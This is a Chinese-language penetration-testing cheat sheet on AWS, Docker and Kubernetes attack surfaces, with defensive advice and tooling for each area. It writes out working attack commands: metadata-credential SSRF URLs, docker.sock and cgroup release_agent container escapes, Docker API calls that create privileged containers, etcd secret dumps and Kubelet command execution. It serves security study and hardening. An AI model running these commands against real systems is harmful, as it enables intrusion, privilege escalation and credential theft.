# 云安全与容器安全 — 攻击面与防御

_安全虾的云安全弹药库，P0 优先级专题。_

---

## 一、AWS 攻击面

### 1. IAM 提权 (Privilege Escalation)

**常见提权路径：**

| 手法 | 原理 | 利用条件 |
|------|------|----------|
| `iam:CreateAccessKey` | 给其他用户创建 Access Key | 对目标用户有此权限 |
| `iam:AttachUserPolicy` | 给自己绑定 AdministratorAccess | 对自己有此权限 |
| `iam:PutUserPolicy` | 内联策略注入 | 对目标用户有此权限 |
| `iam:CreatePolicyVersion` | 覆盖现有策略版本 | 对策略有此权限 |
| `lambda:CreateFunction` + `iam:PassRole` | 创建 Lambda 用已有 Role 执行 | 能创建函数且有 PassRole |
| `ec2:RunInstances` + `iam:PassRole` | 启动 EC2 挂载高权限 Role | 能启动实例且有 PassRole |
| `sts:AssumeRole` | 角色链提权 | 有 AssumeRole 权限 |
| `iam:CreateLoginProfile` | 给已有用户设密码 | 对用户有此权限 |
| `iam:UpdateLoginProfile` | 重置其他用户密码 | 对用户有此权限 |

**经典攻击链：**
1. 获取低权限凭证（泄露的 Access Key、SSRF 获取元数据）
2. `iam:ListAttachedUserPolicies` 枚举当前权限
3. 找到可利用的提权路径
4. 提权到 AdministratorAccess
5. 横向移动到其他账户/服务

**侦察命令：**
```bash
# 枚举当前身份
aws sts get-caller-identity
# 列出所有用户
aws iam list-users
# 列出用户策略
aws iam list-attached-user-policies --user-name <name>
aws iam list-user-policies --user-name <name>
# 列出角色
aws iam list-roles
# 检查可 Assume 的角色
aws sts assume-role --role-arn <arn> --role-session-name test
```

**防御：**
- 最小权限原则 — 只授予必要的 IAM 权限
- 权限边界 (Permissions Boundary) — 限制最大权限范围
- IAM Access Analyzer — 检测过度宽松的策略
- CloudTrail 监控 — 记录所有 API 调用
- MFA 要求 — 敏感操作强制 MFA
- 定期审计 — 检查闲置凭证、过度权限

### 2. SSRF (Server-Side Request Forgery)

**AWS SSRF 关键目标：**
```
# 实例元数据（IMDSv1 - 无需认证）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/meta-data/user-data  # 启动脚本，可能含凭证

# IMDSv2（需要先获取 token）
PUT http://169.254.169.254/latest/api/token
TTL: 21600
# 然后：
GET http://169.254.169.254/latest/meta-data/  -H "X-aws-ec2-metadata-token: <token>"
```

**SSRF 到 RCE 的经典链：**
1. SSRF → 读取元数据 → 获取 IAM 临时凭证
2. 用凭证枚举 S3、EC2、Lambda 等服务
3. 找到可利用的提权路径
4. 获取更高权限 → 最终拿到 RCE

**ECS/Fargate SSRF：**
```
# ECS 容器元数据
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

**Lambda SSRF：**
```
# Lambda 环境变量中可能包含凭证
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN
```

**防御：**
- 使用 IMDSv2（强制 token）— 禁用 IMDSv1
- 限制 IMDS 访问（网络层或安全组）
- 不在 user-data 中存放敏感信息
- IAM Role 最小权限
- WAF 规则拦截对 169.254.169.254 的请求
- 输入验证和 URL 白名单

### 3. S3 存储桶安全

**常见问题：**
- 公开存储桶（ACL 或 Bucket Policy 允许匿名访问）
- 错误配置的 Bucket Policy（通配符过多）
- 未加密敏感数据
- 日志未启用

**侦察：**
```bash
# 列举存储桶
aws s3 ls
# 检查存储桶 ACL
aws s3api get-bucket-acl --bucket <name>
# 检查公开访问配置
aws s3api get-public-access-block --bucket <name>
# 尝试匿名列举
aws s3 ls s3://<bucket-name> --no-sign-request
```

### 4. 其他 AWS 服务攻击面

- **Lambda:** 代码注入、环境变量泄露、过大的 IAM Role
- **RDS:** 安全组配置错误、公开访问、未加密
- **CloudFormation:** 模板注入、资源删除
- **Systems Manager (SSM):** 命令执行、参数存储泄露
- **Secrets Manager / Parameter Store:** 凭证泄露

---

## 二、Docker 安全

### 1. 容器逃逸 (Container Escape)

**手法一：Docker Socket 挂载**
```bash
# 如果 /var/run/docker.sock 被挂载进容器
# 攻击者可以直接操作宿主机 Docker
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host
```

**手法二：特权模式 (Privileged Mode)**
```bash
# 特权容器几乎拥有宿主机所有 capabilities
docker run --privileged -it alpine
# 在特权容器内：
# 挂载宿主机磁盘
fdisk -l
mount /dev/sda1 /mnt
# 或者通过 cgroup 逃逸
```

**手法三：cgroup 逃逸 (CVE-2022-0492 等)**
```bash
# 利用 cgroup release_agent
d=/sys/fs/cgroup/../../../
mkdir -p $d/x
echo 1 > $d/x/notify_on_release
echo "<host_path>" > $d/release_agent
# 触发执行
```

**手法四：内核漏洞利用**
- CVE-2022-0185（内核整数溢出）
- CVE-2023-0386（OverlayFS 提权）
- Dirty Pipe (CVE-2022-0847)
- CVE-2024-1086（netfilter UAF）

**手法五：敏感目录挂载**
```bash
# 挂载了 /proc、/sys、/dev 等敏感目录
# 或挂载了宿主机根目录
docker run -v /:/host -it alpine
```

### 2. 镜像安全

**风险：**
- 基础镜像包含已知漏洞
- 镜像中硬编码凭证
- 供应链攻击（恶意镜像）
- 过大的攻击面（不必要的包）

**检测：**
```bash
# Trivy 扫描
trivy image <image-name>
# dockle 检查最佳实践
dockle <image-name>
```

**防御：**
- 使用最小化基础镜像（distroless、alpine）
- 定期扫描镜像漏洞
- 多阶段构建减小攻击面
- 不在镜像中硬编码秘密
- 使用镜像签名验证

### 3. Docker API 未授权访问

```bash
# 扫描 Docker API
nmap -p 2375,2376 <target>
# 列举容器
curl http://<target>:2375/containers/json
# 创建特权容器逃逸
curl -X POST http://<target>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Privileged":true,"Binds":["/:/host"]}'
```

---

## 三、Kubernetes 安全

### 1. RBAC 提权

**常见问题：**
- `cluster-admin` 角色过度授予
- ServiceAccount 权限过大
- 默认 ServiceAccount 有不必要的权限

**侦察：**
```bash
# 当前权限
kubectl auth can-i --list
# 枚举 RBAC
kubectl get roles,clusterroles -A
kubectl get rolebindings,clusterrolebindings -A
```

### 2. Pod 安全

**风险配置：**
- `hostPID: true` — 可看到宿主机进程
- `hostNetwork: true` — 可访问宿主机网络
- `privileged: true` — 特权容器
- 挂载宿主机路径（/、/proc、/var/run/docker.sock）
- `automountServiceAccountToken: true` — 自动挂载 SA token

**Pod 逃逸到宿主机：**
```bash
# 通过 SA token 调用 K8s API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://$KUBERNETES_SERVICE_HOST
# 枚举权限
curl -s $APISERVER/api/v1/namespaces/default/pods -H "Authorization: Bearer $TOKEN"
# 如果有创建 Pod 权限，创建特权 Pod 逃逸
```

### 3. etcd 未授权访问

```bash
# etcd 默认端口 2379
etcdctl --endpoints=http://<target>:2379 get / --prefix
# 获取所有 K8s secrets
etcdctl --endpoints=http://<target>:2379 get /registry/secrets --prefix
```

### 4. Kubelet API

```bash
# Kubelet 默认端口 10250
# 列举 Pod
curl -k https://<target>:10250/pods
# 执行命令（如果未认证）
curl -k https://<target>:10250/exec/<namespace>/<pod>/<container> \
  -d 'cmd=id'
```

### 5. 网络策略缺失

- 默认 K8s 网络允许所有 Pod 间通信
- 缺少 NetworkPolicy 导致横向移动容易

---

## 四、Azure / GCP 攻击面（概要）

### Azure
- **IMDS:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- **Managed Identity:** 类似 AWS IAM Role，通过 IMDS 获取 token
- **Azure AD:** 条件访问策略绕过、应用注册滥用
- **Storage Account:** 公开访问、SAS token 泄露

### GCP
- **Metadata:** `http://metadata.google.internal/computeMetadata/v1/` (需要 `Metadata-Flavor: Google` header)
- **Service Account:** JSON key 泄露、OAuth token 滥用
- **Cloud Storage:** 类似 S3，公开存储桶问题
- **GKE:** 类似 EKS，K8s 攻击面

---

## 五、云安全检测与防御框架

### CIS Benchmarks
- CIS AWS Foundations Benchmark
- CIS Docker Benchmark
- CIS Kubernetes Benchmark

### 工具链
- **Prowler** — AWS 安全评估
- **ScoutSuite** — 多云安全审计
- **kube-bench** — K8s CIS 检查
- **Falco** — 运行时安全监控
- **Trivy** — 镜像/配置漏洞扫描
- **Checkov / tfsec** — IaC 安全扫描

### 关键监控指标
- 新创建的 IAM 用户/角色
- 权限变更事件
- 异常的 API 调用模式
- 容器逃逸行为
- 未授权的元数据访问
- 异常的网络连接

---

_云安全的坑比传统网络安全深，容器逃逸一条链就能从容器打到宿主机。_
